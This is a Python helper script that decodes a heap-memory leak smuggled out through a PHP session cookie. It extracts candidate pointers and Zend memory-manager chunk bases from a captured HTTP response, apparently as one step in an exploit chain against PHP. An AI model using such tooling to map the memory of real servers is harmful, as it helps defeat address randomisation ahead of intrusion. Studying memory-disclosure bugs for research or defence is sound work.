#!/usr/bin/env python3
"""Decode the Set-Cookie heap leak returned by request B.

usage: decode_leak.py RESPONSE_FILE [OUT_TXT]
Prints decoded length, candidate 0x7f.... pointers (at every byte offset),
and the 2MB-aligned Zend MM chunk base histogram. Writes a short report.
"""
import sys, re, urllib.parse
from collections import Counter

path = sys.argv[1] if len(sys.argv) > 1 else 'logs/http_heap_leak_20261021.resp'
out = sys.argv[2] if len(sys.argv) > 2 else None
d = open(path, 'rb').read()
head, _, body = d.partition(b'\r\n\r\n')
m = re.search(rb'Set-Cookie: PHPSESSID=([^\r\n]*?); path=/', head)
if not m:
    print('no Set-Cookie in', path); sys.exit(1)
raw = urllib.parse.unquote_to_bytes(m.group(1).decode('latin1'))
lines = []
lines.append('response=%s bytes=%d cookie_chars=%d decoded=%d' % (path, len(d), len(m.group(1)), len(raw)))
ptrs = []
for off in range(0, len(raw) - 8):
    v = int.from_bytes(raw[off:off+8], 'little')
    if 0x7f0000000000 <= v < 0x800000000000:
        ptrs.append((off, v))
chunks = Counter((v & ~0x1fffff) for _, v in ptrs)
lines.append('candidate_ptrs=%d' % len(ptrs))
lines.append('chunk_bases=%s' % ', '.join('%x:%d' % (k, n) for k, n in chunks.most_common()))
for off, v in ptrs[:64]:
    lines.append('  off=0x%x ptr=0x%x chunk=0x%x' % (off, v, v & ~0x1fffff))
txt = '\n'.join(lines)
print(txt)
if out:
    open(out, 'w').write(txt + '\n')
